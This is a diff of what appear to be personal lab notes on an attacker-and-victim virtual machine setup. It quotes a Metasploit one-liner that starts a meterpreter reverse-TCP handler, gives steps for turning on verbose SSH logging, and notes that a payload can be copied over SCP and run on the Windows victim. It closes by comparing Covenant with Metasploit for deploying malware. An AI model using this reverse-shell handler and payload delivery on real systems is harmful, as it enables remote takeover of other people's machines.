@@ -40,20 +40,20 @@ Victim - Another virtual machine (in this case using Windows)
         NOTE: in the code this whole sequence is chained into one line on line 46: 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {target_ip}; set lport {target_port}; exploit;
 
 
-How to track if HTTP commands/connections are going through?
-    -You can catch the logs of the HTTP connections in real time by
-        * going to /etc
-        * then go to /ssh
-        * then use 'nano' command to edit the 'sshd_config' file
-        * look for the line '#LogLevel INFO'
-        * remove the # then replace INFO with 'VERBOSE'
-        * now run 'sudo journalctl -f' in the command line to track the logs
+    How to track if HTTP commands/connections are going through?
+        -You can catch the logs of the HTTP connections in real time by
+            * going to /etc
+            * then go to /ssh
+            * then use 'nano' command to edit the 'sshd_config' file
+            * look for the line '#LogLevel INFO'
+            * remove the # then replace INFO with 'VERBOSE'
+            * now run 'sudo journalctl -f' in the command line to track the logs
+    
+    How to run the payload on the victim machine?
+        - Using SCP we can connect to the victim machine via SSH and execute the payload 
 
-How to run the payload on the victim machine?
-    - Using SCP we can connect to
 
-
-COVENANT:
+# COVENANT:
 NOTE: What is the difference between covenant and metasploit?
         - Covenant has a web GUI that requires a script to control the mouse to deploy the malware
 
